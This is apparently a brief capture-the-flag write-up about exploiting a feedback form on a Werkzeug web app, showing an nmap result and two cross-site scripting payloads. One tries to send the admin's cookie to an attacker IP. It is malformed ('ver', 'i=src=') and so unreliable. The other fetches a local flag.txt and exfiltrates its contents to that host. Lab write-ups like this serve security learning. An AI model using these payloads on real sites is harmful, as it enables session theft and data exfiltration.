From the description of the room we need to do some client side exploits to read the flag 
Starting with a nmap scan
```
22 OpenSSH 8.2p1
8080 Wekzeug 3.0.1 Python 3.8.10
```
Going to the site its all static but the feedback page If we use xss it will go to are link 
```
<script> ver i=new Image(); i=src="http://10.13.8.255/?cookie="</script>
```
now we have XSS we can use this to try and get the flag and we can do so with this payload
```
<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then (r => fetch ('http://10.13.8.255:8080/?c=' + r)).catch(e => fetch('http://10.13.8.255:8080/?c=' + e))"/>
```